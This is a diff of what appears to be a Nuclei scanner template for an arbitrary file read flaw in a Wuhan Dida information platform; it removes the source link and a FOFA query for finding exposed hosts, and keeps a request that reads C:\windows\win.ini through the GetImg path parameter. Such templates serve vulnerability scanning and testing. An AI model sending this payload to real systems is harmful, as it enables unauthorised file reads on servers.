@@ -3,12 +3,8 @@ info:
   name: 武汉地大信息工程股份有限公司基础信息平台存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zou37hz4n0rt5q7p'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zou37hz4n0rt5q7p
-    fofa: body="/SystemManage/BaseProject"
 http:
 - raw:
   - 'GET /SystemManage/BaseProject/GetImg?path=C:\windows\win.ini HTTP/1.1
